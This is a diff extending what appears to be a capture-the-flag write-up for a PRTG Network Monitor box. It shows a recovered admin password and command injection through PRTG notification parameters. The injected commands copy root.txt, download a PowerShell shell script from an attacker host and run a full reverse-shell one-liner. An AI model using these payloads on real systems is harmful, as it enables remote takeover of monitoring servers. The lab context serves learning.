@@ -71,3 +71,23 @@ entered /Users/All Users/Paessler/PRTG Network Monitor/ and got "PRTG Configurat
 
 User: prtgadmin
 Pass: PrTg@dmin2018
+
+After struggling a lot i got root.txt using this command:
+type C:\Users\Public\kss.txt;cp C:\Users\Administrator\Desktop\root.txt C:\Users\Public\kss.txt
+
+Then I wanted to get a root shell (nt authority\system):
+First I shared a shell using this command on my computer:
+edited Invoke-PowerShellTcp.ps1 last line in order to establish a connection to my computer, then
+
+# python -m SimpleHTTPServer
+
+then I downloaded it exploiting Notification parameters:
+
+C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe IEX(New-Object Net.WebClient).downloadFile('http://10.10.14.71:8000/Invoke-PowerShellTcp.ps1', 'C:\Program Files (x86)\PRTG Network Monitor\Notifications\EXE\PowerShellTcp.ps1')
+
+then created a new Notification and launched it.
+Got it))))
+
+
+Another approach is just to paste this powershell command in one Notification:
+kss.txt;$client = New-Object System.Net.Sockets.TCPClient('10.10.x.x',1337);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close() 
